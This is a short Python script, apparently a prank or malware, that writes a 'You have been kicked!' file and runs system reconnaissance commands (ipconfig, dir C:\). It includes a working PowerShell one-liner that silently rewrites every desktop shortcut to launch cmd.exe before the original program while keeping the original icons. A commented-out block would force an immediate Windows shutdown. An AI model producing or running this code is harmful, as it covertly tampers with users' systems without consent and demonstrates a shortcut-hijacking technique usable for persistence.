import os


print("This is done bro again")  # Prints a message

def create_hello_file(filename):
    with open(filename, 'w') as file:
        file.write("You have been kicked!")

create_hello_file("hello.txt")    # Creates the file
print("File 'hello.txt' created with message.")

#commands
import subprocess

def run_command(command):
    try:
        result = subprocess.run(command, shell=True, text=True, capture_output=True)
        if result.stdout:
            print("Output:\n", result.stdout)
        if result.stderr:
            print("Error:\n", result.stderr)
    except Exception as e:
        print("Failed to run command:", e)

# ====== EXAMPLE COMMANDS TO RUN ======
run_command("ipconfig")
run_command("echo Hello, world!")
run_command("dir C:\\")  # List C drive contents
powershell_script = r"""
powershell -Command "Get-ChildItem \"$env:USERPROFILE\Desktop\" -Filter *.lnk | Where-Object { $_.Name -ne 'Recycle Bin.lnk' } | ForEach-Object { try { $sh=New-Object -ComObject WScript.Shell; $sc=$sh.CreateShortcut($_.FullName); $target=$sc.TargetPath; $args=$sc.Arguments; $icon=$sc.IconLocation; $sc.TargetPath='cmd.exe'; $sc.Arguments='/c start \"\" \"C:\Users\" && start \"\" \"' + $target + '\" ' + $args; $sc.IconLocation=$icon; $sc.Save() } catch {} }"
"""
run_command(powershell_script)
print('The shortcuts ware changed')


#def shutdown_windows():
    #print('shutting down bro')
    #os.system("shutdown /s /t 0")  # Shutdowns Windows after 2 seconds

#shutdown_windows()                # Executes the shutdown
